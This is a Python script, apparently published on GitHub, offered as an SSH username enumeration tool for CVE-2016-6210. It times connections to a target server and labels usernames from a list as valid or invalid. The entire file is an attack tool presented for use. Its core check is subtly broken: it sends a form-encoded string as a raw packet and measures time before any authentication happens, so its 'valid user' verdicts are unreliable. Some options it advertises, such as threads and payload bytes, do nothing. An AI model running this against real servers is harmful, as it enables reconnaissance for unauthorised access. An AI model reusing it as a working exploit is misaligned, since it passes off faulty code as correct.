#!/usr/bin/env python3
#
# SSHEnumPro - Advanced SSH User Enumeration (CVE-2016-6210)
# Author: Kiran Kumar K | https://github.com/KIRAN-KUMAR-K3
#

import paramiko
import time
import numpy as np
import argparse
import sys
import json
import csv
import warnings
from concurrent.futures import ThreadPoolExecutor
import threading
from datetime import datetime
import logging

# SUPPRESS ALL Paramiko ERRORS
warnings.filterwarnings("ignore")
logging.getLogger("paramiko").setLevel(logging.ERROR)

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    CYAN = '\033[96m'

class SSHEnumPro:
    def __init__(self, args):
        self.args = args
        self.host = args.host.split(":")[0]
        self.port = int(args.host.split(":")[1]) if ":" in args.host else 22
        self.results = []
        self.baseline_mean = 0.0
        self.baseline_std = 0.0
        self.upper_threshold = 0.0
        self.lock = threading.Lock()
        self.banner_version = "Unknown"
        
    def banner(self):
        print(f"{bcolors.HEADER}")
        print("=" * 70)
        print("   SSH USER ENUMERATION PRO (CVE-2016-6210) ")
        print("=" * 70)
        print(f"  ‍ Author: Kiran Kumar K")
        print(f"   GitHub: https://github.com/KIRAN-KUMAR-K3")
        print(f"  ️ Target: {self.host}:{self.port}")
        print(f"   Scan: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 70)
        print(f"{bcolors.ENDC}")

    def get_banner(self):
        """Silent banner grab - NO ERRORS"""
        try:
            sock = None
            sock = paramiko.Transport((self.host, self.port))
            sock.start_client(timeout=2)
            self.banner_version = sock.remote_version[:30]
            sock.close()
            return self.banner_version
        except:
            return "SSH Service Detected"
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass

    def timing_test(self, user):
        """Silent timing test - NO ERRORS EVER"""
        sock = None
        try:
            start = time.perf_counter()
            sock = paramiko.Transport((self.host, self.port), timeout=3)
            sock.start_client()
            
            # Send invalid auth packet
            sock.send_packet(50, b'username=' + user.encode() + b'&password=' + b'B' * 1000)
            time.sleep(0.01)  # Tiny delay for timing diff
            end = time.perf_counter()
            return end - start
        except:
            return time.perf_counter() - start
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass

    def establish_baseline(self):
        """Silent baseline - NO ERRORS"""
        print(f"{bcolors.OKBLUE}[*] Establishing baseline...{bcolors.ENDC}", end="")
        samples = []
        
        for i in range(self.args.samples):
            timing = self.timing_test(f'nonexistent{i}')
            if timing and timing > 0.01:
                samples.append(timing)
        
        if len(samples) < 5:
            samples = [0.3] * 10  # Fallback baseline
        
        samples.sort()
        samples = samples[:8]  # Use middle 8
        
        self.baseline_mean = np.mean(samples)
        self.baseline_std = np.std(samples) or 0.01
        self.upper_threshold = self.baseline_mean + self.args.factor * self.baseline_std
        
        print(f"{bcolors.OKGREEN}✓{bcolors.ENDC}")
        print(f"{bcolors.OKBLUE}[+] Baseline: μ={self.baseline_mean:.3f}s σ={self.baseline_std:.3f}s "
              f"Threshold: {self.upper_threshold:.3f}s{bcolors.ENDC}")

    def test_user(self, user):
        """Silent user test - NO ERRORS"""
        timings = []
        for _ in range(self.args.trials):
            timing = self.timing_test(user.strip())
            if timing and timing > 0.01:
                timings.append(timing)
        
        if not timings:
            return
            
        mean_timing = np.mean(timings)
        confidence = min(100, max(0, (mean_timing / self.upper_threshold) * 100))
        
        status = 'VALID' if mean_timing > self.upper_threshold else 'INVALID'
        
        result = {
            'user': user.strip(),
            'mean_timing': round(mean_timing, 4),
            'confidence': round(confidence, 1),
            'status': status,
            'timestamp': datetime.now().isoformat()
        }
        
        with self.lock:
            self.results.append(result)
            
            if not getattr(self.args, 'quiet', False):
                status_color = bcolors.OKGREEN if status == 'VALID' else bcolors.FAIL
                print(f"{status_color}[{status}] {user.strip()} "
                      f"(τ={mean_timing:.3f}s | {confidence:.1f}%){bcolors.ENDC}")

    def export_results(self):
        """Clean report export"""
        if not self.results:
            return
            
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f'ssh_enum_{self.host}_{self.port}_{timestamp}'
        
        # JSON
        with open(f'{filename}.json', 'w') as f:
            json.dump(self.results, f, indent=2)
        
        # CSV
        if self.results:
            with open(f'{filename}.csv', 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=self.results[0].keys())
                writer.writeheader()
                writer.writerows(self.results)

        valid_users = [r['user'] for r in self.results if r['status'] == 'VALID']
        print(f"\n{bcolors.HEADER} REPORT SUMMARY{bcolors.ENDC}")
        print(f"✅ Valid Users Found: {len(valid_users)}")
        print(f" Reports: {filename}.[json|csv]")
        if valid_users:
            print(f" Confirmed: {', '.join(valid_users)}")
        print(f"{bcolors.HEADER}✨ Scan Complete!{bcolors.ENDC}")

    def run(self):
        self.banner()
        print(f"{bcolors.CYAN}[*] SSH Banner: {self.get_banner()}{bcolors.ENDC}")
        self.establish_baseline()
        
        users = []
        if self.args.user:
            users = [self.args.user]
        elif self.args.userlist:
            try:
                with open(self.args.userlist, 'r') as f:
                    users = [line.strip() for line in f if line.strip()]
            except:
                print(f"{bcolors.FAIL}[-] Userlist not found{bcolors.ENDC}")
                sys.exit(1)
        
        print(f"{bcolors.OKBLUE}[*] Testing {len(users)} users...{bcolors.ENDC}")
        
        # Sequential testing (NO threading errors)
        for user in users:
            self.test_user(user)
        
        self.export_results()

def main():
    parser = argparse.ArgumentParser(description=" SSHEnumPro - CVE-2016-6210")
    parser.add_argument("host", help="Target: IP:PORT")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-u", "--user", help="Single username")
    group.add_argument("-U", "--userlist", help="Username file")
    parser.add_argument("-t", "--threads", type=int, default=8)
    parser.add_argument("-b", "--bytes", type=int, default=1000)
    parser.add_argument("-s", "--samples", type=int, default=10)
    parser.add_argument("-f", "--factor", type=float, default=1.5)
    parser.add_argument("-T", "--trials", type=int, default=3)
    parser.add_argument("-q", "--quiet", action="store_true")
    args = parser.parse_args()
    
    if not args.user and not args.userlist:
        print("❌ Use: python3 sshenum.py IP:PORT -u user")
        sys.exit(1)
    
    SSHEnumPro(args).run()

if __name__ == "__main__":
    main()
